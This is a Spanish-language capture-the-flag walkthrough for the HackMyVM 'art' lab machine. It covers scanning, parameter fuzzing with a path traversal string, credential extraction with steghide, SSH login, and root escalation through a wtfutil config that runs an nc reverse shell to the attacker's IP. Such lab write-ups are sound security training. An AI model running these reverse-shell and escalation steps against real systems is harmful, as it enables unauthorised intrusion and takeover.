+++
title = 'art - HackMyVM'
+++

[link => art](https://downloads.hackmyvm.eu/art.zip)

---

## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/arthackmyvm/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.11**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.11 -oN targetscan
```

```txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targetscan
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Sun Feb 23 15:46:35 2025 as: /usr/lib/nmap/nmap -p- --open -sS 
       │ --min-rate 5000 -vvv -n -Pn -oN targetscan 10.38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up, received arp-response (0.000081s latency).
   4   │ Scanned at 2025-02-23 15:46:35 EST for 2s
   5   │ Not shown: 65533 closed tcp ports (reset)
   6   │ PORT   STATE SERVICE REASON
   7   │ 22/tcp open  ssh     syn-ack ttl 64
   8   │ 80/tcp open  http    syn-ack ttl 64
   9   │ MAC Address: 08:00:27:7D:24:6A (Oracle VirtualBox virtual NIC)
  10   │ 
  11   │ Read data files from: /usr/share/nmap
  12   │ # Nmap done at Sun Feb 23 15:46:37 2025 -- 1 IP address (1 host up) scanned in 2.54 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────
```

### **Puertos Abiertos: 22,80**

## Ejecución de scripts de nmap

```bash
sudo nmap -sCV -p22,80 10.38.1.11 -oN scriptsexec
```

```txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: scriptsexec
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Sun Feb 23 15:49:16 2025 as: /usr/lib/nmap/nmap -sCV -p22,80 -o
       │ N scriptsexec 10.38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up (0.00062s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   3072 45:42:0f:13:cc:8e:49:dd:ec:f5:bb:0f:58:f4:ef:47 (RSA)
   9   │ |   256 12:2f:a3:63:c2:73:99:e3:f8:67:57:ab:29:52:aa:06 (ECDSA)
  10   │ |_  256 f8:79:7a:b1:a8:7e:e9:97:25:c3:40:4a:0c:2f:5e:69 (ED25519)
  11   │ 80/tcp open  http    nginx 1.18.0
  12   │ |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
  13   │ |_http-server-header: nginx/1.18.0
  14   │ MAC Address: 08:00:27:7D:24:6A (Oracle VirtualBox virtual NIC)
  15   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  16   │ 
  17   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
       │ .
  18   │ # Nmap done at Sun Feb 23 15:49:24 2025 -- 1 IP address (1 host up) scanned in 7.52 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────
```

## Enumeración de directorios con gobuster 

```bash
gobuster dir -u http://10.38.1.11/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,html,css,js,zip,php
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,css,js,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 170]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
```

## Fuzzing de parámetros con ffuf

```bash
ffuf -u 'http://10.38.1.11/index.php?FUZZ=../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 170
```

```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.38.1.11/index.php?FUZZ=../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 170
________________________________________________

tag                     [Status: 200, Size: 70, Words: 11, Lines: 5, Duration: 20ms]
```

Probando con el archivo **/etc/passwd** no muestra nada.

## Fuzzing de valor de parámetro tag

```bash
ffuf -u 'http://10.38.1.11/index.php?tag=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 70 -s
```

```bash
0
beauty
Beauty
beautiful
```

## Extracción de datos con steghide

```bash
> curl http://10.38.1.11/index.php?tag=beauty

SEE HMV GALLERY!
<br>
 <img src=dsa32.jpg><br>
<!-- Need to solve tag parameter problem. -->

> wget http://10.38.1.11/dsa32.jpg

> steghide extract -sf dsa32.jpg

Enter passphrase: <Enter> 
wrote extracted data to "yes.txt".
```

```txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────
       │ File: yes.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────
   1   │ lion/shel0vesyou
───────┴───────────────────────────────────────────────────────────────────────────────────────────────
```

## Conexión vía ssh con credenciales encontradas

```bash
> ssh lion@10.38.1.11

lion@art:~$ ls
user.txt
lion@art:~$ cat user.txt 
HMV********************
```

## Permisos sudo del usuario lion

```bash
lion@art:~$ sudo -l
Matching Defaults entries for lion on art:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lion may run the following commands on art:
    (ALL : ALL) NOPASSWD: /bin/wtfutil
```

## Escalada de privilegios

### Ejecución de revshell 

```bash
lion@art:~/.config/wtf$ find / -writable -type f 2>/dev/null

/home/lion/.config/wtf/config.yml
```

![nmap host discovery](/images/arthackmyvm/wtfdocs.png)

```yaml
uptime:
      args: ["-e","/bin/bash","10.38.1.10","443"]
      cmd: "nc"
      enabled: true
      position:
        top: 3
        left: 1
        height: 1
        width: 2
      refreshInterval: 30
      type: cmdrunner
```

Ejecución de wtfutil como usuario root

```bash
sudo -u root /bin/wtfutil --config=/home/lion/.config/wtf/config.yml
```

Ejecutar en otra shell de **máquina atacante**

```bash
> nc -nlvp 443
```

### Flag de usuario root

```bash
root@art:/# whoami 
whoami
root

root@art:/# find / -type f -name "root.txt"                       

/var/opt/root.txt

root@art:/# cat /var/opt/root.txt              

mZx*****************HMV
```

